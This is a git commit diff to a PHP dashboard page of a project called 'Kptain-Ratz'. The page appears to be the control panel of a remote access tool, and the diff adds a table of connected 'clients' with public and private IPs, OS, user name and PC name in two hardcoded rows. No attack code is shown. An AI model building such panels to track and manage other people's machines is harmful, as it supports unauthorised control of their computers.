b36b0330cf5527ff717ddd4f7088a43412554965
nzkoxzu <92158080+nzkoxzu@users.noreply.github.com>
2022-05-01 05:08:42 +0200

    Add files via upload

--- kptain/gui/central/home.php
+++ kptain/gui/central/home.php
@@ -12,21 +12,53 @@ if (!isset($_SESSION['loggedin'])) {
 <html>
 	<head>
 		<meta charset="utf-8">
-		<title>Central Interface</title>
 		<link href="style.css" rel="stylesheet" type="text/css">
 		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
 	</head>
 	<body class="loggedin">
 		<nav class="navtop">
 			<div>
-				<h1>Kptain-Ratz</h1>
+				<h1>K-ptain.Ratz</h1>
+				<a href="home.php"><i class="icon-dashboard"></i>Dashboard</a>
 				<a href="profile.php"><i class="fas fa-user-circle"></i>Profile</a>
 				<a href="logout.php"><i class="fas fa-sign-out-alt"></i>Logout</a>
 			</div>
 		</nav>
 		<div class="content">
 			<h2>Central Interface</h2>
-			<p>Welcome back, <?=$_SESSION['name']?>!</p>
+			<p>Logged as : <?=$_SESSION['name']?></p>
+
+			<table>
+				<tr>
+					<th>Client details</th>
+					<th>ID</th>
+					<th>IP adress (Public)</th>
+					<th>IP adress (Private)</th>
+					<th>OS</th>
+					<th>Last seen user</th>
+					<th>PC Name</th>
+				</tr>
+				<tr>
+
+					<td><a href="link.html">View details</a></td>
+					<td><img src="/assets/france.png" /></td>
+					<td>89.88.12.8</td>
+					<td>192.168.90.92</td>
+					<td>Windows 10</td>
+					<td>amad</td>
+					<td>AMADBOSS-PC</td>
+				</tr>
+				<tr>
+					<td><a href="link.html">View details</a></td>
+					<td><img src="/assets/us.png" /></td>
+					<td>8.8.8.8</td>
+					<td>192.168.1.10</td>
+					<td>Windows 7 SP1</td>
+					<td>Administrator</td>
+					<td>Random-PC</td>
+				</tr>
+			</table>
+
 		</div>
 	</body>
 </html>
